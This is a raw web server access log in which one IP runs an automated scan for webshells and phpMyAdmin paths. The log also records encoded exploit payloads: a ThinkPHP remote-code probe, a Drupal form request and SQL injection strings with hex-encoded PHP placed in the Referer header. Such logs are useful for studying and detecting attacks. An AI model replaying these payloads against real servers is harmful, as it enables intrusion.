116.23.19.20 - - [18/Jun/2019:15:56:09 +0800] "GET /favicon.ico HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3704.400 QQBrowser/10.4.3587.400"
183.136.190.62 - - [18/Jun/2019:15:59:41 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
59.46.79.10 - - [18/Jun/2019:16:39:06 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:16:39:30 +0800] "GET /robots.txt HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:16:39:54 +0800] "POST /App1a4f6a2f.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:16:40:06 +0800] "GET /webdav/ HTTP/1.1" 499 0 "-" "Mozilla/5.0"
59.46.79.10 - - [18/Jun/2019:16:40:30 +0800] "GET /help.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:40:54 +0800] "GET /java.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:41:18 +0800] "GET /_query.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:41:41 +0800] "GET /test.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:42:05 +0800] "GET /db_cts.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:42:30 +0800] "GET /db_pma.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:42:54 +0800] "GET /logon.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:43:18 +0800] "GET /help-e.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:43:42 +0800] "GET /license.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:44:04 +0800] "GET /log.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:44:30 +0800] "GET /hell.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:44:57 +0800] "GET /pmd_online.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:45:21 +0800] "GET /x.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:45:45 +0800] "GET /shell.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:46:10 +0800] "GET /htdocs.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:46:34 +0800] "GET /b.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:46:58 +0800] "GET /sane.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:47:22 +0800] "GET /desktop.ini.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:47:46 +0800] "GET /z.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:48:10 +0800] "GET /lala.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:48:34 +0800] "GET /lala-dpr.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:48:57 +0800] "GET /wpc.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:49:22 +0800] "GET /wpo.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:49:46 +0800] "GET /t6nv.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:50:10 +0800] "GET /muhstik.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:50:35 +0800] "GET /text.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
42.236.54.22 - - [18/Jun/2019:16:50:50 +0800] "GET / HTTP/1.1" 504 591 "http://47.106.79.26" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
59.46.79.10 - - [18/Jun/2019:16:50:59 +0800] "GET /wp-config.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:51:23 +0800] "GET /muhstik.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:51:47 +0800] "GET /muhstik2.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:52:11 +0800] "GET /muhstiks.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:52:37 +0800] "GET /muhstik-dpr.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:53:02 +0800] "GET /lol.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:53:26 +0800] "GET /uploader.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:53:50 +0800] "GET /cmd.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:54:14 +0800] "GET /cmv.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:54:38 +0800] "GET /cmdd.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:55:02 +0800] "GET /knal.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
178.45.25.144 - - [18/Jun/2019:16:55:05 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
59.46.79.10 - - [18/Jun/2019:16:55:26 +0800] "GET /cmd.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:55:50 +0800] "GET /shell.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:56:17 +0800] "GET /appserv.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:56:41 +0800] "GET /scripts/setup.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:57:07 +0800] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:57:31 +0800] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:57:53 +0800] "GET /phpmyadmin/scripts/db___.init.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:58:18 +0800] "GET /phpMyAdmin/scripts/db___.init.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:58:42 +0800] "GET /plugins/weathermap/editor.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:59:06 +0800] "GET /cacti/plugins/weathermap/editor.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:59:30 +0800] "GET /index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50 HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:16:59:57 +0800] "GET /d7.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:00:21 +0800] "GET /rxr.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:01:10 +0800] "GET /home.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:01:24 +0800] "GET /1x.php HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:01:34 +0800] "GET /undx.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:02:21 +0800] "GET /payload.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:02:36 +0800] "GET /spider.php HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:03:10 +0800] "GET /izom.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:03:24 +0800] "GET /composers.php HTTP/1.1" 504 591 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:03:37 +0800] "GET /composer.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:04:01 +0800] "GET /hue2.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:04:26 +0800] "GET /Drupal.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:04:50 +0800] "GET /lang.php?f=1 HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:05:14 +0800] "GET /izom.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:05:38 +0800] "GET /payload.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:06:02 +0800] "GET /new_license.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:06:26 +0800] "GET /images/!.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:06:50 +0800] "GET /images/vuln.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:07:12 +0800] "GET /hd.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:07:37 +0800] "GET /images/up.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:08:02 +0800] "GET /images/attari.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:08:27 +0800] "GET /images/jsspwneed.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:08:51 +0800] "GET /images/stories/cmd.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:09:15 +0800] "GET /images/stories/filemga.php?ssp=RfVbHu HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:09:39 +0800] "GET /up.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:10:03 +0800] "GET /huoshan.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:10:27 +0800] "GET /laravel.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
183.136.190.62 - - [18/Jun/2019:17:10:40 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36"
59.46.79.10 - - [18/Jun/2019:17:10:51 +0800] "GET /yu.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
40.77.167.61 - - [18/Jun/2019:17:11:00 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
59.46.79.10 - - [18/Jun/2019:17:11:14 +0800] "GET /wp-content/plugins/si-captcha-for-wordpress/captcha/ttffonts/theme.php?up=1 HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
59.46.79.10 - - [18/Jun/2019:17:11:38 +0800] "POST /wuwu11.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
93.120.135.137 - - [18/Jun/2019:17:11:43 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
59.46.79.10 - - [18/Jun/2019:17:12:02 +0800] "POST /xw.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:12:26 +0800] "POST /xw1.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:12:50 +0800] "POST /9678.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:13:14 +0800] "POST /wc.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
101.251.242.238 - - [18/Jun/2019:17:13:16 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:13:38 +0800] "POST /xx.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:14:02 +0800] "POST /xx.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:14:26 +0800] "POST /s.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:15:14 +0800] "POST /sheep.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:15:29 +0800] "POST /w.php HTTP/1.1" 504 189 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:15:38 +0800] "POST /index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
59.46.79.10 - - [18/Jun/2019:17:16:02 +0800] "POST /%75%73%65%72/%72%65%67%69%73%74%65%72?%65%6c%65%6d%65%6e%74%5f%70%61%72%65%6e%74%73=%74%69%6d%65%7a%6f%6e%65%2f%74%69%6d%65%7a%6f%6e%65%2f%23%76%61%6c%75%65&%61%6a%61%78%5f%66%6f%72%6d=1&%5f%77%72%61%70%70%65%72%5f%66%6f%72%6d%61%74=%64%72%75%70%61%6c%5f%61%6http://47.106.79.26/ HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
59.46.79.10 - - [18/Jun/2019:17:16:26 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)"
59.46.79.10 - - [18/Jun/2019:17:16:50 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)"
59.46.79.10 - - [18/Jun/2019:17:17:14 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)"
59.46.79.10 - - [18/Jun/2019:17:17:38 +0800] "POST /%75%73%65%72%2e%70%68%70 HTTP/1.1" 499 0 "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\x22id\x22;s:3:\x22'/*\x22;s:3:\x22num\x22;s:141:\x22*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0--\x22;s:4:\x22name\x22;s:3:\x22ads\x22;}554fcae493e564ee0dc75bdf2ebf94ca" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
59.46.79.10 - - [18/Jun/2019:17:18:02 +0800] "POST /%75%73%65%72%2e%70%68%70 HTTP/1.1" 499 0 "45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:\x22num\x22;s:147:\x22*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0--\x22;s:2:\x22id\x22;s:9:\x22' union/*\x22;s:4:\x22name\x22;s:3:\x22ads\x22;}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
